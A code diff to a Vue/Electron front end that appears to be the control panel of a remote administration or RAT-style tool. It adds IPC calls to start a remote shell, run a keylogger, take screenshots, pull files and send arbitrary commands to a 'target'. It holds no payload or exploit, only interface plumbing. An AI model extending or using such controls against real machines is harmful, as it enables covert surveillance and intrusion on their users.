@@ -108,7 +108,7 @@ export default {
         // todo Screenshot
       }
       if (this.menus[index]==='键盘记录'){
-        // todo Keylogger
+        this.sendCommand("find BUPT")
       }
       if (this.menus[index]==='文件目录'){
         // todo FileBrowser
@@ -130,6 +130,54 @@ export default {
         this.changeCurrentTarget(packet[0].uuid)
       })
       ipcRenderer.send('requestTargetList')
+    },
+    requestShell () {
+      ipcRenderer.once('getShell', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestShell', 'start')
+    },
+    stopShell () {
+      ipcRenderer.once('stopShell', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestShell', 'stop')
+    },
+    requestKeylogger () {
+      ipcRenderer.once('updateKeylogger', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestKeylogger', 'start')
+    },
+    disconnectTarget () {
+      ipcRenderer.once('disconnected', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('disconnect')
+    },
+    getScreenShot () {
+      ipcRenderer.once('ScreenShot', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestScreenShot')
+    },
+    getFile(path) {
+      ipcRenderer.once('transfile', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestFile', path)
+    },
+    requestFilePreview() {
+      ipcRenderer.once('filepreview', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('requestFilePreview')      
+    },
+    sendCommand (commandLines) {
+      ipcRenderer.once('commandSended', (event, packet) => {
+        alert('Vue:' + packet)
+      })
+      ipcRenderer.send('sendCommand', commandLines)
     },
     // table的右键点击当前行事件
     rightClick (row, column, event) {
